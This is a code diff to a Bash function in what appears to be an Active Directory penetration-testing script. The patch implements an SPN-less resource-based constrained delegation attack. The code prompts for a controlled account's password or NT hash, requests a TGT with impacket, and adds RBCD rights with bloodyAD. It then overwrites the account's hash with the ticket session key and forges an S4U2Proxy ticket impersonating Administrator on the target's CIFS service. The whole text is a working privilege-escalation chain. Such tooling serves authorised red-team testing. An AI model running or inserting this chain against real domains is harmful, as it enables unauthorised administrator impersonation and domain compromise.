@@ -2873,7 +2873,7 @@ rbcd_spnless_attack() {
             echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
-            echo -e "${BLUE}[*] Performing RBCD attack: impersonate users on target via S4U2Proxy. Please specify target:${NC}"
+            echo -e "${BLUE}[*] Performing SPN-less RBCD attack: impersonate users on target via S4U2Proxy. Please specify target:${NC}"
             target_rbcd=""
             read -rp ">> " target_rbcd </dev/tty
             while [ "${target_rbcd}" == "" ]; do
@@ -2881,46 +2881,56 @@ rbcd_spnless_attack() {
                 read -rp ">> " target_rbcd </dev/tty
             done
             echo -e "${BLUE}[*] Please specify SPN-less account under your control:${NC}"
-            spnless_rbcd=""
-            read -rp ">> " spnless_rbcd </dev/tty
-            while [ "${spnless_rbcd}" == "" ]; do
+            user_spnless=""
+            read -rp ">> " user_spnless </dev/tty
+            while [ "${user_spnless}" == "" ]; do
                 echo -e "${RED}Invalid name.${NC} Please specify account under your control:"
-                read -rp ">> " spnless_rbcd </dev/tty
+                read -rp ">> " user_spnless </dev/tty
             done
-            echo -e "${CYAN}[*] Performing RBCD attack against ${target_rbcd} using SPN-less account ${spnless_rbcd}${NC}"
+            echo -e "${YELLOW}[!] Warning: This will modify the password of the SPN-less account under your control:${NC}"
+            echo -e "${BLUE}[*] Please provide password or NT hash of SPN-less account under your control:${NC}"
+            pass_spnless=""
+            read -rp ">> " pass_spnless </dev/tty
+            while [ "${pass_spnless}" == "" ]; do
+                echo -e "${RED}Invalid password.${NC} Please specify password or NT hash of account under your control:"
+                read -rp ">> " pass_spnless </dev/tty
+            done
+            echo -e "${CYAN}[*] Performing RBCD attack against ${target_rbcd} using SPN-less account ${user_spnless}${NC}"
             if [ ! -f "${impacket_getTGT}" ]; then
                 echo -e "${RED}[-] getTGT.py not found! Please verify the installation of impacket${NC}"
             else
-                if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
-                    current_dir=$(pwd)
-                    cd "${output_dir}/Credentials" || exit
-                    echo -e "${CYAN}[*] Requesting TGT for current user${NC}"
-                    spnless_hash=$(iconv -f ASCII -t UTF-16LE <(printf "%s" "$password") | $(which openssl) dgst -md4 | cut -d " " -f 2)
-                    run_command "${impacket_getTGT} ${domain}/${user} -hashes :${spnless_hash} -dc-ip ${dc_ip}" | grep -v "Impacket" | sed '/^$/d' | tee "${output_dir}/Credentials/getTGT_output_${dc_domain}"
-                    cd "${current_dir}" || exit
-                    if [ -f "${output_dir}/Credentials/${user}.ccache" ]; then
-                        krb_ticket="${output_dir}/Credentials/${user}.ccache"
-                        echo -e "${GREEN}[+] TGT generated successfully:${NC} $krb_ticket"
-                        ticketsesskey=$(${impacket_describeticket} "${output_dir}/Credentials/${user}.ccache" | grep 'Ticket Session Key' | cut -d " " -f 17)
-                        run_command "${impacket_changepasswd} ${argument_imp}\\@${dc_ip} -newhashes :${ticketsesskey}" | tee -a "${output_dir}/Modification/impacket_spnless_changepasswd_${dc_domain}.txt"
-                        password=""
-                        pass_bool=false
-                        hash="${ticketsesskey}"
-                        hash_bool=true
-                        authenticate
-                        run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add rbcd '${target_rbcd}$' '${spnless_rbcd}'" 2>&1 | tee -a "${output_dir}/Modification/bloodyAD/bloodyad_out_rbcdspnless_${dc_domain}.txt"
-                        if grep -q "can now impersonate users" "${output_dir}/Modification/bloodyAD/bloodyad_out_rbcd_${dc_domain}.txt"; then
-                            echo -e "${GREEN}[+] RBCD Attack successful! Attempting to generate ticket to impersonate Administrator${NC}"
-                            run_command "KRB5CCNAME=${output_dir}/Credentials/${user}.ccache ${impacket_getST} -u2u -spn 'cifs/${target_rbcd}.${domain}' -impersonate Administrator -dc-ip ${dc_ip} '${domain}/${spnless_rbcd}' -k -no-pass"
-                            echo -e "${CYAN}[!] Run command below to remove impersonation rights:${NC}"
-                            echo -e "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} remove rbcd '${target_rbcd}$' '${spnless_rbcd}'"
+                if [[ ${#pass_spnless} -eq 32 ]]; then
+                    spnless_hash="${pass_spnless}"
+                else
+                    spnless_hash=$(iconv -f ASCII -t UTF-16LE <(printf "%s" "$pass_spnless") | $(which openssl) dgst -md4 | cut -d " " -f 2)
+                fi
+                current_dir=$(pwd)
+                cd "${output_dir}/Modification/" || exit
+                echo -e "${CYAN}[*] Requesting TGT for user ${user_spnless}${NC}"
+                run_command "${impacket_getTGT} ${domain}/${user_spnless} -hashes :${spnless_hash} -dc-ip ${dc_ip}" | grep -v "Impacket" | sed '/^$/d' | tee -a "${output_dir}/Modification/impacket_spnless_changepasswd_${dc_domain}.txt"
+                if [ -f "${output_dir}/Modification/${user_spnless}.ccache" ]; then
+                    krb_ticket="${output_dir}/Modification/${user_spnless}.ccache"
+                    echo -e "${GREEN}[+] TGT generated successfully:${NC} $krb_ticket"
+                    run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add rbcd '${target_rbcd}$' '${user_spnless}'" 2>&1 | tee -a "${output_dir}/Modification/bloodyAD/bloodyad_out_rbcdspnless_${dc_domain}.txt"
+                    ticketsesskey=$(${impacket_describeticket} "${output_dir}/Modification/${user_spnless}.ccache" | grep 'Ticket Session Key' | cut -d " " -f 17)
+                    run_command "${impacket_changepasswd} ${domain}/${user_spnless}\\@${dc_ip} -hashes :${spnless_hash} -newhashes :${ticketsesskey}" | tee -a "${output_dir}/Modification/impacket_spnless_changepasswd_${dc_domain}.txt"
+                    if grep -q "can now impersonate users" "${output_dir}/Modification/bloodyAD/bloodyad_out_rbcdspnless_${dc_domain}.txt"; then
+                        echo -e "${GREEN}[+] SPN-less RBCD Attack successful! Attempting to generate ticket to impersonate Administrator${NC}"
+                        run_command "KRB5CCNAME=${output_dir}/Modification/${user_spnless}.ccache ${impacket_getST} -u2u -spn 'cifs/${target_rbcd}.${domain}' -impersonate Administrator -dc-ip ${dc_ip} '${domain}/${user_spnless}' -k -no-pass"
+                        if [ -f "${output_dir}/Modification/Administrator@cifs_${target_rbcd}.${domain}@${domain}.ccache" ]; then
+                            echo -e "${GREEN}[+] Ticket impersonating Administrator generated successfully!${NC}"
+                        else
+                            echo -e "${RED}[-] Generation of ticket impersonating Administrator failed!${NC}"
                         fi
-                    else
-                        echo -e "${RED}[-] Failed to generate TGT${NC}"
+                        echo -e "${CYAN}[!] Run command below to reset password of ${user_spnless}:${NC}"
+                        echo -e "${impacket_changepasswd} ${domain}/${user_spnless}@${dc_ip} -hashes :${ticketsesskey} -newpass <NEW PASSWORD>"
+                        echo -e "${CYAN}[!] Run command below to remove impersonation rights:${NC}"
+                        echo -e "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} remove rbcd '${target_rbcd}$' '${user_spnless}'"
                     fi
                 else
-                    echo -e "${RED}[-] Error! Requires password, NTLM hash or AES key...${NC}"
+                    echo -e "${RED}[-] Failed to generate TGT${NC}"
                 fi
+                cd "${current_dir}" || exit
             fi
 
         fi
